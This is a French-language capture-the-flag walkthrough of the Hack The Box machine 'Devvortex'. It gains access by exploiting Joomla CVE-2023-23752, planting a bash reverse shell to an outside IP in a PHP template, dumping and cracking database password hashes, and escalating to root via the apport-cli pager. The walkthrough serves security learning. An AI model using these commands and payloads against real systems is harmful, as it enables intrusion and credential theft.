# Devvortex

	echo "10.10.11.242 devvortex.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.242 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.242 -oN nmap.txt
	feroxbuster --silent -u http://devvortex.htb
	
Scans classiques.

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)

Rien d'intéressant à première vue.

Un peu de fuzzing supplémentaire : 

	ffuf -H "Host: FUZZ.devvortex.htb" -u http://devvortex.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fc 302

On voit un sous-domaine "dev" : 

> dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 1992ms]

    echo "10.10.11.242 dev.devvortex.htb" >> /etc/hosts
    curl http://dev.devvortex.htb/robots.txt
    
    User-agent: *
    Disallow: /administrator/
    Disallow: /api/
    Disallow: /bin/
    Disallow: /cache/
    Disallow: /cli/
    Disallow: /components/
    Disallow: /includes/
    Disallow: /installation/
    Disallow: /language/
    Disallow: /layouts/
    Disallow: /libraries/
    Disallow: /logs/
    Disallow: /modules/
    Disallow: /plugins/
    Disallow: /tmp/

Sur la page http://dev.devvortex.htb/administrator/ on voit un portail de login Joomla. 


    joomscan -u http://dev.devvortex.htb/administrator/
    
    
La version semble vulnérable. 

Voir : 
- https://nvd.nist.gov/vuln/detail/CVE-2023-23752 
- https://www.exploit-db.com/exploits/51334


        vim joomla.rb
        sudo gem install httpx docopt paint
        ruby joomla.rb http://dev.devvortex.htb

On obtient un nom d'utilisateur ("lewis") et son mot de passe.

Ces credentials nous permettent de nous connecter sur le Joomla. On voit des templates, dont un "login.php", exécutant du code PHP que l'on a le droit de modifier : 

http://dev.devvortex.htb/administrator/index.php?option=com_templates&view=template&id=222&file=L2xvZ2luLnBocA%3D%3D&isMedia=0

Exemple de payload à rajouter dans le PHP : 

    system('bash -c "bash -i >& /dev/tcp/10.10.16.11/9999 0>&1"');
    
En se déconnectant, avec la redirection sur la page de login, on reçoit immédiatement le reverse-shell en tant que "www-data"
    
Le compte "lewis" fonctionne aussi pour la base de données : 

    python3 -c "import pty;pty.spawn('/bin/bash')"
    mysql -u lewis -p joomla
    mysql> show databases;
    mysql> use joomla;
    mysql> show tables;
    mysql> SELECT username, password FROM sd4fg_users;

On obtient un hash pour l'utilisateur "logan" :

    vim hash.txt
    john --wordlist=~/rockyou.txt hash.txt
    
	ssh logan@10.10.11.242
	cat user.txt	 
    

## Élévation de privilèges


	sudo -l
    
>User logan may run the following commands on devvortex:
>&nbsp;&nbsp;&nbsp;&nbsp;(ALL : ALL) /usr/bin/apport-cli

    /usr/bin/apport-cli -v

> 2.20.11


<br>Une élévation de privilèges locale existe grâce au pager.
Voir : https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb

On peut donc utiliser l'application pour générer un rapport factice, puis pour le voir à la fin. On pourra, à ce moment-là, utiliser le trick du '!' pour passer root : 

    sudo /usr/bin/apport-cli --file-bug
    ...
    !/bin/sh
	whoami
	cat /root/root.txt
